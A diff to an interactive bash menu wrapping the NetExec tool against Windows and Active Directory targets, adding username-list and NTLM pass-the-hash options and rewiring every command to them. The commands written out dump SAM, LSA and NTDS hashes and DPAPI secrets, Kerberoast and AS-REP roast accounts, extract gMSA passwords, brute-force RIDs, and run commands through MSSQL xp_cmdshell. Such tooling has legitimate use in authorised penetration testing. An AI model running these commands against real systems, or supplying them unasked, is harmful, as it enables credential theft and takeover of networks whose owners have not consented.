@@ -78,13 +78,55 @@ get_target() {
 get_credentials() {
     echo -e "${YELLOW}Do you want to use credentials? (y/n):${NC}"
     read -p "> " use_creds
-    
+
     if [[ $use_creds == "y" || $use_creds == "Y" ]]; then
-        echo -e "${YELLOW}Enter Username:${NC}"
-        read -p "> " USERNAME
-        echo -e "${YELLOW}Enter Password:${NC}"
-        read -s -p "> " PASSWORD
-        echo ""
+
+        # ── Username: single or file ──────────────────────────
+        echo -e "\n${YELLOW}Username type:${NC}"
+        echo "1) Single username"
+        echo "2) From file (userlist)"
+        read -p "> " user_type
+
+        if [[ $user_type == "2" ]]; then
+            while true; do
+                echo -e "${YELLOW}Enter path to username file:${NC}"
+                read -p "> " USERNAME_FILE
+                if [ -f "$USERNAME_FILE" ]; then
+                    USERNAME="[file: $USERNAME_FILE]"
+                    USER_OPT="-u $USERNAME_FILE"
+                    break
+                else
+                    echo -e "${RED}[!] File not found: $USERNAME_FILE${NC}"
+                fi
+            done
+        else
+            echo -e "${YELLOW}Enter Username:${NC}"
+            read -p "> " USERNAME
+            USER_OPT="-u $USERNAME"
+            USERNAME_FILE=""
+        fi
+
+        # ── Auth: password or NTLM hash ───────────────────────
+        echo -e "\n${YELLOW}Authentication type:${NC}"
+        echo "1) Password"
+        echo "2) NTLM Hash"
+        read -p "> " auth_type
+
+        if [[ $auth_type == "2" ]]; then
+            echo -e "${YELLOW}Enter NTLM Hash:${NC}"
+            read -s -p "> " HASH
+            echo ""
+            PASSWORD=""
+            AUTH_CRED="-H $HASH"
+        else
+            echo -e "${YELLOW}Enter Password:${NC}"
+            read -s -p "> " PASSWORD
+            echo ""
+            HASH=""
+            AUTH_CRED="-p $PASSWORD"
+        fi
+
+        # ── Domain ────────────────────────────────────────────
         echo -e "${YELLOW}Enter Domain (optional, press Enter to skip):${NC}"
         read -p "> " DOMAIN
         if [ ! -z "$DOMAIN" ]; then
@@ -92,7 +134,8 @@ get_credentials() {
         else
             DOMAIN_OPTION=""
         fi
-        
+
+        # ── Local Auth ────────────────────────────────────────
         echo -e "${YELLOW}Use local authentication? (y/n):${NC}"
         read -p "> " use_local
         if [[ $use_local == "y" || $use_local == "Y" ]]; then
@@ -100,7 +143,8 @@ get_credentials() {
         else
             LOCAL_AUTH=""
         fi
-        
+
+        # ── Kerberos ──────────────────────────────────────────
         echo -e "${YELLOW}Use Kerberos? (y/n):${NC}"
         read -p "> " use_kerb
         if [[ $use_kerb == "y" || $use_kerb == "Y" ]]; then
@@ -108,13 +152,16 @@ get_credentials() {
         else
             KERBEROS=""
         fi
-        
+
         # Save to config
         echo "USERNAME=$USERNAME" >> "$CONFIG_FILE"
         echo "DOMAIN=$DOMAIN" >> "$CONFIG_FILE"
     else
         USERNAME="''"
-        PASSWORD="''"
+        USER_OPT="-u ''"
+        AUTH_CRED="-p ''"
+        PASSWORD=""
+        HASH=""
         DOMAIN_OPTION=""
         LOCAL_AUTH=""
         KERBEROS=""
@@ -124,9 +171,10 @@ get_credentials() {
 # Function to show main menu
 show_menu() {
     echo -e "\n${GREEN}=== Main Menu ===${NC}"
-    echo -e "${CYAN}Target: $TARGET${NC}"
+    echo -e "${CYAN}Target  : $TARGET${NC}"
     echo -e "${CYAN}Username: $USERNAME${NC}"
-    echo -e "${CYAN}Domain: ${DOMAIN:-'Not set'}${NC}"
+    echo -e "${CYAN}Auth    : ${HASH:+Hash} ${PASSWORD:+Password}${NC}"
+    echo -e "${CYAN}Domain  : ${DOMAIN:-'Not set'}${NC}"
     echo ""
     echo "1) 🔐 Authentication Tests"
     echo "2) 📋 Basic Enumeration"
@@ -162,7 +210,7 @@ run_auth() {
     
     if [ "$USERNAME" != "''" ]; then
         echo -e "\n${YELLOW}[*] Local Authentication:${NC}"
-        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" --local-auth
+        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED --local-auth
         
         echo -e "\n${YELLOW}[*] SMB Signing Check:${NC}"
         nxcrun smb "$TARGET" --gen-relay-list "relay_${TARGET}.txt"
@@ -284,13 +332,13 @@ run_basic_enum() {
     nxcrun smb "$TARGET"
     
     echo -e "\n${YELLOW}[*] List Shares:${NC}"
-    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
+    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
     
     echo -e "\n${YELLOW}[*] List Users:${NC}"
-    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --users
+    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --users
     
     echo -e "\n${YELLOW}[*] RID Brute Force:${NC}"
-    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
+    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
     
     read -p "Press Enter to continue..."
 }
@@ -324,9 +372,9 @@ run_cred_dump_advanced() {
             echo "2) secdump (Security dump)"
             read -p "Method [1-2]: " sam_method
             if [ "$sam_method" == "1" ]; then
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam regdump
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam regdump
             else
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam secdump
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam secdump
             fi
             ;;
         2)
@@ -335,9 +383,9 @@ run_cred_dump_advanced() {
             echo "2) secdump (Security dump)"
             read -p "Method [1-2]: " lsa_method
             if [ "$lsa_method" == "1" ]; then
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa regdump
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa regdump
             else
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa secdump
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa secdump
             fi
             ;;
         3)
@@ -352,9 +400,9 @@ run_cred_dump_advanced() {
             fi
             
             if [ "$ntds_method" == "1" ]; then
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --ntds drsuapi $enabled_flag
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --ntds drsuapi $enabled_flag
             else
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --ntds vss $enabled_flag
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --ntds vss $enabled_flag
             fi
             ;;
         4)
@@ -382,9 +430,9 @@ run_cred_dump_advanced() {
             fi
             
             if [ -z "$dpapi_opts" ]; then
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $mkfile_opt $pvk_opt
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $mkfile_opt $pvk_opt
             else
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $dpapi_opts $mkfile_opt $pvk_opt
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $dpapi_opts $mkfile_opt $pvk_opt
             fi
             ;;
         5)
@@ -393,19 +441,19 @@ run_cred_dump_advanced() {
             echo "2) wmi (WMI enumeration)"
             read -p "Method [1-2]: " sccm_method
             if [ "$sccm_method" == "1" ]; then
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm disk
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm disk
             else
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm wmi
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm wmi
             fi
             ;;
         6)
             echo -e "\n${YELLOW}[*] Dumping all credentials...${NC}"
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam --lsa --ntds --dpapi
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam --lsa --ntds --dpapi
             ;;
         7)
             echo -e "\n${YELLOW}[*] Dump specific user from NTDS${NC}"
             read -p "Enter username to dump: " target_user
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --ntds --user "$target_user"
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --ntds --user "$target_user"
             ;;
         8)
             return
@@ -455,33 +503,33 @@ run_mapping_enum() {
             
             case $share_choice in
                 1)
-                    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
+                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
                     ;;
                 2)
                     read -p "Enter directory path (default: root): " dir_path
                     if [ -z "$dir_path" ]; then
-                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir
+                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir
                     else
-                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir "$dir_path"
+                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir "$dir_path"
                     fi
                     ;;
                 3)
                     read -p "Filter by access (read/write/read,write): " filter
-                    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --filter-shares "$filter"
+                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --filter-shares "$filter"
                     ;;
             esac
             ;;
         2)
             echo -e "\n${YELLOW}[*] Network Interfaces:${NC}"
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --interfaces
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --interfaces
             ;;
         3)
             echo -e "\n${YELLOW}[*] SMB Sessions:${NC}"
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --smb-sessions
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --smb-sessions
             ;;
         4)
             echo -e "\n${YELLOW}[*] Disks:${NC}"
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --disks
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --disks
             ;;
         5)
             echo -e "\n${YELLOW}[*] Logged-on Users${NC}"
@@ -490,10 +538,10 @@ run_mapping_enum() {
             read -p "Choice [1-2]: " user_choice
             
             if [ "$user_choice" == "1" ]; then
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users
             else
                 read -p "Enter username to search (regex supported): " search_user
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users-filter "$search_user"
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users-filter "$search_user"
             fi
             ;;
         6)
@@ -507,30 +555,30 @@ run_mapping_enum() {
             
             case $domain_choice in
                 1)
-                    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users
+                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users
                     ;;
                 2)
                     read -p "Enter output filename: " export_file
-                    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users-export "$export_file"
+                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users-export "$export_file"
                     ;;
                 3)
                     read -p "Enter username: " specific_user
-                    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users "$specific_user"
+                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users "$specific_user"
                     ;;
                 4)
                     read -p "Enter group name (or press Enter for all groups): " group_name
                     if [ -z "$group_name" ]; then
-                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --groups
+                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --groups
                     else
-                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --groups "$group_name"
+                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --groups "$group_name"
                     fi
                     ;;
                 5)
                     read -p "Enter computer name (or press Enter for all computers): " computer_name
                     if [ -z "$computer_name" ]; then
-                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --computers
+                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --computers
                     else
-                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --computers "$computer_name"
+                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --computers "$computer_name"
                     fi
                     ;;
             esac
@@ -539,35 +587,35 @@ run_mapping_enum() {
             echo -e "\n${YELLOW}[*] Local Groups${NC}"
             read -p "Enter local group name (or press Enter for all groups): " local_group
             if [ -z "$local_group" ]; then
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups
             else
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups "$local_group"
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups "$local_group"
             fi
             ;;
         8)
             echo -e "\n${YELLOW}[*] Password Policy:${NC}"
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --pass-pol
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --pass-pol
             ;;
         9)
             echo -e "\n${YELLOW}[*] RID Brute Force${NC}"
             read -p "Enter max RID (default: 4000): " max_rid
             if [ -z "$max_rid" ]; then
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
             else
-                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute "$max_rid"
+                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute "$max_rid"
             fi
             ;;
         10)
             echo -e "\n${YELLOW}[*] RDP Connections (qwinsta):${NC}"
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --qwinsta
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --qwinsta
             ;;
         11)
             echo -e "\n${YELLOW}[*] Running Processes (tasklist):${NC}"
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --tasklist
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --tasklist
             ;;
         12)
             echo -e "\n${YELLOW}[*] All-in-One Enumeration:${NC}"
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --interfaces --smb-sessions --disks --loggedon-users --users --groups --local-groups --pass-pol --rid-brute --qwinsta --tasklist
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --interfaces --smb-sessions --disks --loggedon-users --users --groups --local-groups --pass-pol --rid-brute --qwinsta --tasklist
             ;;
         13)
             return
@@ -592,14 +640,14 @@ run_smb_enum() {
     fi
     
     echo -e "\n${YELLOW}[*] All-in-One SMB Enumeration:${NC}"
-    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --groups --local-groups --loggedon-users --sessions --shares --pass-pol
+    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --groups --local-groups --loggedon-users --sessions --shares --pass-pol
     
     echo -e "\n${YELLOW}[*] Running Spider_plus Module:${NC}"
     read -p "Spider_plus read-only? (y/n): " read_only
     if [[ $read_only == "n" || $read_only == "N" ]]; then
-        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus -o READ_ONLY=false
+        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus -o READ_ONLY=false
     else
-        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus
+        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus
     fi
     
     read -p "Press Enter to continue..."
@@ -618,25 +666,25 @@ run_ldap_enum() {
     fi
     
     echo -e "\n${YELLOW}[*] LDAP All-in-One (Basic):${NC}"
-    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --trusted-for-delegation --password-not-required --admin-count --users --groups
+    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --trusted-for-delegation --password-not-required --admin-count --users --groups
     
     echo -e "\n${YELLOW}[*] Find Delegation Relationships:${NC}"
-    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --find-delegation
+    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --find-delegation
     
     echo -e "\n${YELLOW}[*] Kerberoasting:${NC}"
-    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --kerberoasting "kerberoast_${TARGET}.txt"
+    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --kerberoasting "kerberoast_${TARGET}.txt"
     
     echo -e "\n${YELLOW}[*] ASREProast:${NC}"
-    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --asreproast "asreproast_${TARGET}.txt"
+    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --asreproast "asreproast_${TARGET}.txt"
     
     echo -e "\n${YELLOW}[*] ADCS Enumeration:${NC}"
-    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS -M adcs
+    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS -M adcs
     
     echo -e "\n${YELLOW}[*] MachineAccountQuota:${NC}"
-    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS -M maq
+    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS -M maq
     
     echo -e "\n${YELLOW}[*] gMSA (Group Managed Service Accounts):${NC}"
-    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa
+    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa
     
     read -p "Press Enter to continue..."
 }
@@ -667,23 +715,23 @@ run_advanced_ldap() {
     case $ldap_choice in
         1)
             echo -e "\n${YELLOW}[*] Finding delegation relationships:${NC}"
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --find-delegation
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --find-delegation
             ;;
         2)
             echo -e "\n${YELLOW}[*] Users and computers trusted for delegation:${NC}"
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --trusted-for-delegation
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --trusted-for-delegation
             ;;
         3)
             echo -e "\n${YELLOW}[*] Users with PASSWD_NOTREQD flag:${NC}"
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --password-not-required
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --password-not-required
             ;;
         4)
             echo -e "\n${YELLOW}[*] Users with adminCount=1 (privileged users):${NC}"
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --admin-count
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --admin-count
             ;;
         5)
             echo -e "\n${YELLOW}[*] Enumerating domain users:${NC}"
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users
             ;;
         6)
             echo -e "\n${YELLOW}[*] Export users to file${NC}"
@@ -691,7 +739,7 @@ run_advanced_ldap() {
             if [ -z "$user_export" ]; then
                 user_export="users_${TARGET}.txt"
             fi
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users-export "$user_export"
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users-export "$user_export"
             echo -e "${GREEN}[+] Users exported to: $user_export${NC}"
             ;;
         7)
@@ -699,7 +747,7 @@ run_advanced_ldap() {
             echo -e "${CYAN}Example: DC=domain,DC=com${NC}"
             read -p "Enter Base DN: " base_dn
             echo -e "\n${YELLOW}[*] Testing with custom Base DN:${NC}"
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --base-dn "$base_dn" --users
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --base-dn "$base_dn" --users
             ;;
         8)
             echo -e "\n${YELLOW}[*] Custom LDAP Query${NC}"
@@ -716,7 +764,7 @@ run_advanced_ldap() {
             fi
             
             echo -e "\n${YELLOW}[*] Running custom query:${NC}"
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --query "$ldap_filter" "$ldap_attrs"
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --query "$ldap_filter" "$ldap_attrs"
             ;;
         9)
             return
@@ -751,24 +799,24 @@ run_gmsa_ops() {
     case $gmsa_choice in
         1)
             echo -e "\n${YELLOW}[*] Listing all gMSA accounts:${NC}"
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa
             ;;
         2)
             echo -e "\n${YELLOW}[*] Convert gMSA ID to password hash${NC}"
             read -p "Enter gMSA account ID: " gmsa_id
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_id"
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_id"
             ;;
         3)
             echo -e "\n${YELLOW}[*] Decrypt gMSA password from LSA${NC}"
             read -p "Enter gMSA account name: " gmsa_account
-            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_account"
+            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_account"
             ;;
         4)
             echo -e "\n${YELLOW}[*] Extracting all gMSA passwords...${NC}"
             
             # First list all gMSA accounts
             echo -e "\n${CYAN}Step 1: Listing gMSA accounts${NC}"
-            gmsa_output=$(nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa 2>&1)
+            gmsa_output=$(nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa 2>&1)
             echo "$gmsa_output"
             
             # Extract gMSA IDs and try to convert them
@@ -776,7 +824,7 @@ run_gmsa_ops() {
             echo "$gmsa_output" | grep -o "S-[0-9-]\+" | while read -r gmsa_sid; do
                 if [ ! -z "$gmsa_sid" ]; then
                     echo -e "\n${YELLOW}[*] Converting SID: $gmsa_sid${NC}"
-                    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_sid"
+                    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_sid"
                 fi
             done
             
@@ -785,7 +833,7 @@ run_gmsa_ops() {
             echo "$gmsa_output" | grep -i "cn=" | grep -o "CN=[^,]*" | cut -d'=' -f2 | while read -r gmsa_name; do
                 if [ ! -z "$gmsa_name" ]; then
                     echo -e "\n${YELLOW}[*] Attempting LSA decryption for: $gmsa_name${NC}"
-                    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_name"
+                    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_name"
                 fi
             done
             ;;
@@ -812,12 +860,12 @@ run_mssql_enum() {
     fi
     
     echo -e "\n${YELLOW}[*] MSSQL Authentication:${NC}"
-    nxcrun mssql "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH
+    nxcrun mssql "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH
     
     echo -e "\n${YELLOW}[*] Try to enable xp_cmdshell and run command:${NC}"
     read -p "Enter command to execute (or press Enter to skip): " cmd
     if [ ! -z "$cmd" ]; then
-        nxcrun mssql "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH -x "$cmd"
